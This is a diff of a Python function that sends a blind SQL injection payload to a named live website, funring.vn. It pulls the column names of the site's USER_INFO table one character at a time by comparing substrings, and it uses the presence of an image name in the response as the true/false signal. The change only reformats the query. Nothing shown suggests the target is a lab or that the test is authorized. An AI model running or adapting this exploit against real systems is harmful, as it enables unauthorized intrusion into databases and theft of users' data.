@@ -12,11 +12,16 @@ def checkUrl(row, pos, lower, higher):
     lower = chr(lower)
     higher = chr(higher)
     r = requests.get("http://funring.vn/vn/detail_artist.jsp?id=-1' or \
-     substr((select column_name from (select a.*,ROWNUM as rn \
-     from (select column_name from all_tab_columns where table_name = 'USER_INFO') a where ROWNUM<1000) \
-     where rn="+row+"),"+pos+",1)>'"+lower + "' and substr((select column_name from \
-     (select a.*,ROWNUM as rn from (select column_name from all_tab_columns where table_name = 'USER_INFO') a \
-     where ROWNUM<1000) where rn="+row+"),"+pos+",1)<'"+higher)
+     substr((select column_name \
+     from (select a.*,ROWNUM as rn \
+     from (select column_name from all_tab_columns where table_name = 'USER_INFO') a \
+     where ROWNUM<1000) \
+     where rn="+row+"),"+pos+",1)>'"+lower + "' and \
+     substr((select column_name \
+     from (select a.*,ROWNUM as rn \
+     from (select column_name from all_tab_columns where table_name = 'USER_INFO') a \
+     where ROWNUM<1000) \
+     where rn="+row+"),"+pos+",1)<'"+higher)
     if "nhatthanh2.jpg" in r.content:
         return True
     else:
